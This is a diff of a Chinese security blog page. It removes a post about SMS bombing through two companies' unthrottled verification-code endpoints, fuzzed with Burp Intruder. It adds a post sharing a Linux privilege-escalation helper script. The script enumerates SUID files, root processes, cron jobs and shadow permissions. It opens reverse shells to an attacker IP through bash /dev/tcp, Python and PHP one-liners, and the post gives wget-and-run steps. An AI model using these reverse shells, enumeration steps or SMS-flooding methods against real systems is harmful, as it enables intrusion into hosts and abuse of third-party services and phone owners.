@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>SMS bombing | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="SMS bombing | 九世的博客">
+  <title>Linux辅助提权 | 九世的博客</title>
+  <meta name="keywords" content=" Linux提权 ">
+  <meta name="description" content="Linux辅助提权 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -898,9 +898,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-SMS-bombing" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Linux辅助提权" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">SMS bombing</h1>
+        <h1 class="article-title">Linux辅助提权</h1>
     
     <div class="article-meta">
         
@@ -909,14 +909,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">Linux提权</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-01-28 11:36</time>
+        创建时间:<time class="date" title="更新时间: 2019-07-27 17:33:18">2019-07-27 17:08</time>
         
     </div>
     <div class="article-meta">
@@ -938,7 +938,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码"><span class="toc-text">代码</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -953,18 +953,24 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天早上，想挖一个逻辑漏洞来掌握一下技巧，就上google直接搜intext:获取验证码 inurl:/login，然后找到一个某航空的短信轰炸和某平安的<br><img src="https://game.manga-joho.com/wp-content/uploads/2018/06/Screenshot_20180624-194317-min-e1529837190130.jpg" alt="Screenshot_20180624-194317-min-e1529837190130.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>某平安</b><br><img src="https://s2.ax1x.com/2019/01/28/kKolWt.md.png" alt="kKolWt.md.png"><br>burp抓包<br><img src="https://s2.ax1x.com/2019/01/28/kKo8Qf.png" alt="kKo8Qf.png"><br>发送到Repeater尝试修改zoneCode里面的数值，发现没有规律。有些能够发送成功，有些失败<br>zoneCode:98<br><img src="https://s2.ax1x.com/2019/01/28/kKoUoj.md.png" alt="kKoUoj.md.png"></p>
-<p>zoneCode:88<br><img src="https://s2.ax1x.com/2019/01/28/kKo0Wq.png" alt="kKo0Wq.png"></p>
-<p>然后改为其他的有的又能发送成功，直接发送到intruder然后fuzz。<br><img src="https://s2.ax1x.com/2019/01/28/kKosyT.png" alt="kKosyT.png"></p>
-<p>结果：<br><img src="https://s2.ax1x.com/2019/01/28/kKo2TJ.png" alt="kKo2TJ.png"></p>
-<p><img src="https://s2.ax1x.com/2019/01/28/kKofYR.png" alt="kKofYR.png"></p>
-<p><b>某航空</b><br><img src="https://s2.ax1x.com/2019/01/28/kKoHmD.png" alt="kKoHmD.png"></p>
-<p>抓包后发送到Repeater,直接点击两次发送，居然两次都能成功。也就是没有效验或限制了，直接发送到intruder<br><img src="https://s2.ax1x.com/2019/01/28/kKTP0g.png" alt="kKTP0g.png"></p>
-<p><img src="https://s2.ax1x.com/2019/01/28/kKTZpq.md.png" alt="kKTZpq.md.png"></p>
-<p><img src="https://s2.ax1x.com/2019/01/28/kKTe10.png" alt="kKTe10.png"></p>
-<p>手机截图，，，，嗯。。。实验到一半好像烂了充不进电，所以很抱歉= =<br><img src="https://ws1.sinaimg.cn/large/005GOaLIgy1fxycd6uqhhj3073073mx2.jpg" alt="005GOaLIgy1fxycd6uqhhj3073073mx2.jpg"></p>
-<p>转载请声明：转自422926799.github.io</p>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=415593515&auto=1&height=66"></iframe>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天整理链接并发公众号的时候发现了，一个辅助Linux提权的shell脚本。看了也行还行，那么我也写一个好了<br><img src="http://pic.netbian.com/uploads/allimg/190409/232118-1554823278d145.jpg" alt="232118-1554823278d145.jpg"></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">echo "A B C D E F G H I J K L N M"</span><br><span class="line">jiet()&#123;</span><br><span class="line">	echo "是否查询执行[1]/[2]"</span><br><span class="line">	read gsrc</span><br><span class="line">	if test $gsrc  -eq "1"</span><br><span class="line">	then</span><br><span class="line">		clear</span><br><span class="line">		runs</span><br><span class="line">	elif test $&#123;#gsrc&#125; -eq "0"</span><br><span class="line">	then</span><br><span class="line">		clear</span><br><span class="line">		runs</span><br><span class="line"></span><br><span class="line">	else</span><br><span class="line">		echo "[!] 退出...."</span><br><span class="line">		exit 0	</span><br><span class="line">	fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fshell()&#123;</span><br><span class="line">	echo "[1]NC反弹shell"</span><br><span class="line">	echo "[2]python反弹shell"</span><br><span class="line">	echo "[3]PHP反弹shell"</span><br><span class="line">	read input</span><br><span class="line">	if test $input -eq "1"</span><br><span class="line">	then</span><br><span class="line">		echo "在攻击机执行nc -lvp 4444"</span><br><span class="line">		echo "输入攻击机的IP"</span><br><span class="line">		read host</span><br><span class="line">		bash -i &gt;&amp; /dev/tcp/$host/4444 0&gt;&amp;1</span><br><span class="line">	elif test $input -eq "2"</span><br><span class="line">	then</span><br><span class="line">		echo "在攻击机执行nc -lvp 4444"</span><br><span class="line">		echo "输入攻击机IP"</span><br><span class="line">		read host</span><br><span class="line">		python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$host',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span><br><span class="line">	</span><br><span class="line">	elif test $input -eq "3"</span><br><span class="line">	then</span><br><span class="line"></span><br><span class="line">		echo "在攻击机执行nc -lvp 4444"</span><br><span class="line">		echo "输入攻击机IP"</span><br><span class="line">		read host</span><br><span class="line">		php -r '$sock=fsockopen("'$host'",4444);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span><br><span class="line">	fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">runs()&#123;</span><br><span class="line">	wen_array=("https://www.cnblogs.com/linuxsec/articles/6080882.html" "https://guif.re/linuxeop" "https://www.ddosi.com/l/" "https://github.com/SecWiki/linux-kernel-exploits--Linux提权exp下载" "https:/	      	/shenaniganslabs.io/2019/02/13/Dirty-Sock.html" "https://www.secquan.org/Discuss/1069715" "https://www.cnblogs.com/hookjoy/p/6612595.html")</span><br><span class="line">	echo "[1] 查看系统基本架构和信息"</span><br><span class="line">	echo "[2] 本机IP查询"</span><br><span class="line">	echo "[3] 列出以root权限运行的进程"</span><br><span class="line">	echo "[4] 寻找系统里可以用的SUID文件"</span><br><span class="line">	echo "[5] 查看系统环境变量"</span><br><span class="line">	echo "[6] 查看/etc/passwd文件权限和/etc/shadow文件权限"</span><br><span class="line">	echo "[7] 计划任务"</span><br><span class="line">	echo "[8] 查看网络信息"</span><br><span class="line">	echo "[9] 一些不错的提权文章"</span><br><span class="line">	echo "[10] 反弹shell"</span><br><span class="line">	echo "[11] 退出"</span><br><span class="line"></span><br><span class="line">	read sum</span><br><span class="line">	if test $sum -eq "1"</span><br><span class="line">	then</span><br><span class="line">		echo "---系统版本信息---"</span><br><span class="line">		uname -a</span><br><span class="line">		echo "---系统架构---"</span><br><span class="line">		lsb_release -a</span><br><span class="line">		echo "---系统版本---"</span><br><span class="line">		cat /proc/version</span><br><span class="line">		jiet</span><br><span class="line">	elif test $sum -eq "2"</span><br><span class="line">	then</span><br><span class="line">		echo "---本机IP信息---"</span><br><span class="line">		ifconfig</span><br><span class="line">		jiet</span><br><span class="line">	elif test $sum -eq "3"</span><br><span class="line">	then</span><br><span class="line">		echo "---以root权限运行的进程---"</span><br><span class="line">		ps -fu root</span><br><span class="line">		jiet</span><br><span class="line">	elif test $sum -eq "4"</span><br><span class="line">	then</span><br><span class="line">		echo "---可用的SUID文件---"</span><br><span class="line">		find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">		jiet	</span><br><span class="line">	elif test $sum -eq "5"</span><br><span class="line">	then</span><br><span class="line">		echo "---PATH---"</span><br><span class="line">		echo $PATH</span><br><span class="line">		jiet</span><br><span class="line">	elif test $sum -eq "6"</span><br><span class="line">	then</span><br><span class="line">		echo "---passwd&amp;&amp;shadow"</span><br><span class="line">		ls -l /etc | grep passwd</span><br><span class="line">		ls -l /etc | grep shadow</span><br><span class="line">		jiet</span><br><span class="line">	elif test $sum -eq "7"</span><br><span class="line">	then</span><br><span class="line">		echo "---/etc内的计划任务---"</span><br><span class="line">		ls -l /etc/cron*</span><br><span class="line">		jiet</span><br><span class="line">	elif test $sum -eq "8"</span><br><span class="line">	then</span><br><span class="line">		echo "---网络信息---"</span><br><span class="line">		netstat -antup</span><br><span class="line">		jiet</span><br><span class="line"></span><br><span class="line">	elif test $sum -eq "9"</span><br><span class="line">	then</span><br><span class="line">		echo "---文章链接---"</span><br><span class="line">		for((i=0;i&lt;$&#123;#wen_array[*]&#125;;i++)) do</span><br><span class="line">			echo $&#123;wen_array[i]&#125;</span><br><span class="line">		done</span><br><span class="line">		jiet</span><br><span class="line">	elif test $sum -eq "10"</span><br><span class="line">	then</span><br><span class="line">		echo "---反弹shell---"</span><br><span class="line">		fshell</span><br><span class="line">		jiet</span><br><span class="line">	elif test $sum -eq "11"</span><br><span class="line">	then</span><br><span class="line">		echo "Bye"</span><br><span class="line">		exit 0</span><br><span class="line">	fi</span><br><span class="line">&#125;</span><br><span class="line">runs</span><br></pre></td></tr></table></figure>
+<p>运行例子<br><img src="https://s2.ax1x.com/2019/07/27/eMF3RA.png" alt="eMF3RA.png"></p>
+<p>查看基本信息<br><img src="https://s2.ax1x.com/2019/07/27/eMFYsP.png" alt="eMFYsP.png"></p>
+<p>本机IP查询<br><img src="https://s2.ax1x.com/2019/07/27/eMFdIg.png" alt="eMFdIg.png"></p>
+<p>以root权限运行的进程<br><img src="https://s2.ax1x.com/2019/07/27/eMFDRs.png" alt="eMFDRs.png"></p>
+<p>找出系统可用的SUID文件<br><img src="https://s2.ax1x.com/2019/07/27/eMFcLV.png" alt="eMFcLV.png"></p>
+<p>查看系统环境<br><img src="https://s2.ax1x.com/2019/07/27/eMFhi4.png" alt="eMFhi4.png"></p>
+<p>查看/etc/passwd和/etc/shadow的读取权限<br><img src="https://s2.ax1x.com/2019/07/27/eMF5W9.png" alt="eMF5W9.png"></p>
+<p>查看/etc内的计划任务<br><img src="https://s2.ax1x.com/2019/07/27/eMk478.png" alt="eMk478.png"></p>
+<p>查看网络信息<br><img src="https://s2.ax1x.com/2019/07/27/eMAW8J.png" alt="eMAW8J.png"></p>
+<p>一些提权的文章<br><img src="https://s2.ax1x.com/2019/07/27/eMAjxA.png" alt="eMAjxA.png"></p>
+<p>反弹shell<br><img src="https://s2.ax1x.com/2019/07/27/eMESqP.png" alt="eMESqP.png"></p>
+<p>反弹测试<br><img src="https://s2.ax1x.com/2019/07/27/eMEA2j.md.png" alt="eMEA2j.md.png"></p>
+<p><img src="https://s2.ax1x.com/2019/07/27/eMEExs.png" alt="eMEExs.png"></p>
+<p>使用帮助<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/422926799/note/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Linux%E6%8F%90%E6%9D%83/%E7%94%A8%E4%BA%8E%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83%E7%9A%84sh/rsh.sh</span><br><span class="line">chmod +x rsh.sh</span><br><span class="line">./rsh.sh</span><br></pre></td></tr></table></figure></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -974,12 +980,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>SMS bombing</p>
+    <p><span class="copy-title">文章标题:</span>Linux辅助提权</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-01-28, 11:36:47</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/299eb776.html" title="SMS bombing">http://422926799.github.io/posts/299eb776.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-07-27, 17:08:51</p>
+    <p><span class="copy-title">最后更新:</span>2019-07-27, 17:33:18</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b406cd6c.html" title="Linux辅助提权">http://422926799.github.io/posts/b406cd6c.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
